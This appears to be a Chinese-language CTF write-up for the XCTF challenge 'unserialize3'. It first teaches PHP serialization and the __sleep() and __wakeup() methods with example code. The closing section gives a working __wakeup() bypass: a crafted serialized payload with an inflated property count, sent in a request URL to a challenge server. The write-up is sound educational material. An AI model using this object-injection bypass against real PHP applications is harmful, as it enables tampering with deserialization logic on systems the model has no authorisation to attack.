# PHP反序列化

>题目
>攻防世界--unserialize3

## 重点前提
PHP代码审计：序列化与反序列化（serialize&&unserialize）

## 序列化
> __把一个对象或者数组的变量转化成字符串的方式__

所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。

序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。
> 例子

```php

<?php 

class Person
{
    public  $name;
    public  $age;
    private $sex = "Male";

    public function __construct($name = '',$age=22)
    {
        $this->name = $name;
        $this->age = $age;
    }   
}

$person = new Person('Yufei',30);

echo serialize($person);

```
结果如下:
```
O:6:"Person":3:{s:4:"name";s:5:"Yufei";s:3:"age";i:30;s:11:"Personsex";s:4:"Male";}
```
表示含义：
```
 (Object) O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}
```
> 上述例子中的第一个“3”，表示类中对象的数目

如果要剔除某些公开的属性，比如 $age，这种情况下，我们要怎么做呢 ？
### 魔术方法 __sleep()

当调用 serialize() 函数序列化一个实例时，会首先检查该实例是否存在 __sleep() 方法，如果该方法存在，则自动调用，否则使用默认的序列化方式。

我们可以给一个类定义 __sleep() 方法来定制类的实例的序列化输出结果，剔除哪些不是必须序列化的属性，比如保存了超大数据的属性。

__sleep()函数原型：

```php
public array function __sleep()
{
    // 定制序列化结果
}
```
> 该魔术函数没有参数，但有数组返回值（该方法返回一个包含对象中所有应被序列化的变量名称的数组）

例子：
```php
<?php
class Person
{
    public $sex;
    public $name;
    public $age;

    public function __construct($name="",  $age=18, $sex='Male')
    {
        $this->name = $name;
        $this->age  = $age;
        $this->sex  = $sex;
    }

    /**
     * @return array
     */
    public function __sleep() {
        echo "但使用 serialize() 方法序列化实例时，会自动调用此方法\n";
        $this->name = base64_encode($this->name);
        $this->school = 'SaDai';
        return array('name', 'age','school');
    }
}

$person = new Person('XiaoLan');
echo serialize($person),"\n";
?>
```
结果如下：
```
但使用 serialize() 方法序列化实例时，会自动调用此方法
O:6:"Person":3:{s:4:"name";s:12:"WGlhb0xhbg==";s:3:"age";i:18;s:6:"school";s:5:"SaDai";}
```
例子2:
```php
<?php
class User{
	const SITE = 'uusama';

	public $username;
	public $nickname;
	private $password;

	public function __construct($username, $nickname, $password)
	{
		$this->username = $username;
		$this->nickname = $nickname;
		$this->password = $password;
	}

	// 重载序列化调用的方法
	public function __sleep()
	{
		// 返回需要序列化的变量名，过滤掉password变量
		return array('username', 'nickname');
	}
}
$user = new User('uusama', 'uu', '123456');
echo (serialize($user));
?>
```
结果如下：
```
O:4:"User":2:{s:8:"username";s:6:"uusama";s:8:"nickname";s:2:"uu";}
```
## 反序列化
> 我们可以将对象序列化为字符串并保存起来，那么如何把这些序列化后的字符串恢复成原样呢？
> > 反序列化（unserialize）
> > > 函数原型

```php
mixed unserialize ( string $str )
```
> 例子：
```php
<?php
class Person
{
    public $sex;
    public $name;
    public $age;

    public function __construct($name="",  $age=200, $sex='Male')
    {
        $this->name = $name;
        $this->age  = $age;
        $this->sex  = $sex;
    }
}

$person = new Person('Xiao',2000,'Male');

$s = serialize( $person );//序列化
echo $s,"\n";
$person2 = unserialize( $s );//反序列化
echo $person2->name,"\n";
echo $person2->age,"\n";
//echo $person2,"\n";wrong
?>
```
结果如下：
```
O:6:"Person":3:{s:3:"sex";s:4:"Male";s:4:"name";s:4:"Xiao";s:3:"age";i:2000;}
Xiao
2000
```
> 注
> > 如果传递的字符串不可解序列化，则返回 FALSE，并产生一个E_NOTICE

如果我们在应用反序列化时修改某些数据，或创建一个数据库连接，或添加一些属性，要怎么做呢 ？
> 若被反序列化的变量是一个对象，在成功重新构造对象之后，PHP会自动地试图去调用__wakeup()成员函数（如果存在的话）

### 魔法函数 __wakeup()

当使用 unserialize() 反序列化一个对象成功后，会自动调用该对象的 __wakup() 魔术方法

例子:
```php
<?php
class User{
	const SITE = 'uusama';

	public $username;
	public $nickname;
	private $password;
	private $order;

	public function __construct($username, $nickname, $password)
	{
		$this->username = $username;
		$this->nickname = $nickname;
		$this->password = $password;
	}

	// 定义反序列化后调用的方法
	public function __wakeup()
	{
		$this->password = $this->username;
	}
}
$user_ser = 'O:4:"User":2:{s:8:"username";s:6:"uusama";s:8:"nickname";s:2:"uu";}';
var_dump(unserialize($user_ser));//var_dump():函数转储有关一个或多个变量的信息。该信息包含变量的类型和值
?>
```
结果如下:
```
object(User)#1 (4) {
  ["username"]=>
  string(6) "uusama"
  ["nickname"]=>
  string(2) "uu"
  ["password":"User":private]=>
  string(6) "uusama"
  ["order":"User":private]=>
  NULL
}
```
>得到结论:

>反序列化可对 __原有对象的属性__ 进行修改,添加

## 前提看完,该做题了吧
![image](https://github.com/uicciu/image/blob/main/unserialize.png)

入眼__wakeup(),结合题目unserialize(),估计用到序列化与反序列化,并且应当绕过__wakeup(),避免'bad requests'

### __wakeup()漏洞

序列化字符串对象属性数量大于实际的属性数量时，将不会调用__wakeup函数

结合题目,进行序列化,绕过__wakeup(),返回给code
```php
<?php
class xctf{                      //定义一个名为xctf的类
public $flag = '111';            //定义一个公有的类属性$flag，值为111
public function __wakeup(){      //定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本
exit('bad requests');
}
}
$test = new xctf();           //使用new运算符来实例化该类（xctf）的对象为test
echo(serialize($test));       //输出被序列化的对象（test）
?>
```
结果如下:
```
O:4:"xctf":1:{s:4:"flag";s:3:"111";}
```
将1改成2
```
O:4:"xctf":2:{s:4:"flag";s:3:"111";}
```
访问http://223.112.5.156:49397/?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}
得到flag
